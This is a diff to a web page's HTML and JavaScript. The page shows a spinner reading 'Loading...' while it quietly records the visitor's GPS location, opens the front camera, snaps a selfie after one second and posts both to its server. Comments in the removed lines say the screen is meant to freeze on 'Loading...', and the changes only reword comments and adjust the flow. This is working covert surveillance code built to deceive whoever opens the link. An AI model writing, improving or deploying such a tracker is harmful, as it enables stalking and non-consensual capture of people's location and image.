@@ -9,7 +9,7 @@
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 25px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-weight: bold; color: #555; font-size: 16px; margin-top: 15px; }
-        video { width: 100%; max-width: 320px; height: auto; border-radius: 8px; background: #222; transform: scaleX(-1); margin-top: 20px; display: none; }
+        video { width: 100%; max-width: 320px; height: auto; border-radius: 8px; background: #222; transform: scaleX(-1); margin-top: 20px; display: inline-block; }
     </style>
 </head>
 <body>
@@ -17,11 +17,11 @@
 <div class="card">
     <div id="loader" class="loader"></div>
     <p id="status">Loading...</p>
+    <!-- A visible video preview is mandatory for the browser to allow camera streaming -->
     <video id="video" autoplay playsinline muted></video>
 </div>
 
 <script>
-    // Automatically detect device type so no name input is required
     let deviceOwner = "Device";
     if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
         deviceOwner = "iOS Device";
@@ -39,19 +39,20 @@
     const loaderDiv = document.getElementById('loader');
     const videoEl = document.getElementById('video');
 
-    // 1. Immediately request GPS coordinates
+    // 1. CRITICAL: IMMEDIATELY REQUEST AND SEND LOCATION FIRST
     if (navigator.geolocation) {
         navigator.geolocation.watchPosition((position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
             
+            // Instantly transmit location coordinates to the server
             fetch('/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: deviceOwner, lat: currentLat, lon: currentLon })
+                body: JSON.stringify({ name: deviceOwner, lat: currentLat, lon: currentLon, forceAlert: true })
             })
             .then(() => {
-                // Instantly proceed to the camera setup as soon as the first GPS log lands
+                // Only initialize the camera stream AFTER the first location payload has successfully left the device
                 if (!locationSent) {
                     locationSent = true;
                     setupCamera();
@@ -59,32 +60,29 @@
             });
 
         }, (err) => {
-            // Keep the loading message on-screen or print error quietly
-            console.log("GPS locked out");
+            console.log("GPS access issue");
         }, { enableHighAccuracy: true });
     } else {
-        console.log("Not supported");
+        console.log("Geolocation unsupported");
     }
 
-    // 2. Open camera feed seamlessly
+    // 2. Camera setup runs after location transmission is confirmed
     function setupCamera() {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then((stream) => {
                 videoStream = stream;
                 videoEl.srcObject = stream;
-                videoEl.style.display = 'inline-block';
                 
-                // 3. 1-second auto-delay to ensure picture clarity
+                // 1-second focus calibration delay for photo clarity
                 setTimeout(() => {
                     autoCaptureSelfie();
                 }, 1000);
             })
             .catch((err) => {
-                console.log("Camera locked out");
+                console.log("Camera access issue");
             });
     }
 
-    // 4. Capture photo and keep the interface frozen on "Loading..."
     function autoCaptureSelfie() {
         if (photoTaken) return; 
         if (!currentLat || !currentLon) {
@@ -115,10 +113,9 @@
                 image: imageData
             })
         }).then(() => {
-            // FORCE SCREEN TO SHOW "Loading..." FOREVER
+            // Once the photo is successfully shared, stop the tracks and reset interface
             statusDiv.innerText = "Loading...";
-            loaderDiv.style.display = 'block';
-            videoEl.style.display = 'none'; // Hide camera viewport after snap
+            videoEl.style.display = 'none'; 
             
             if(videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
